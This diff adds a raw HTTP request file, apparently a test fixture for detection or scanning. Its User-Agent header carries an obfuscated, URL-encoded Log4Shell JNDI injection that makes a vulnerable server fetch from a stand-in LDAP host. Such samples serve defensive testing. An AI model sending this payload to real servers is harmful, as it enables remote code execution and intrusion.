@@ -1,0 +1,7 @@
+GET / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: %24%7B%24%7Benv%3AENV_NAME%3A-j%7Dn%24%7Benv%3AENV_NAME%3A-d%7Di%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Dd%24%7Benv%3AENV_NAME%3A-a%7Dp%24%7Benv%3AENV_NAME%3A-%3A%7D%2F%2Fexample.com%2F
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
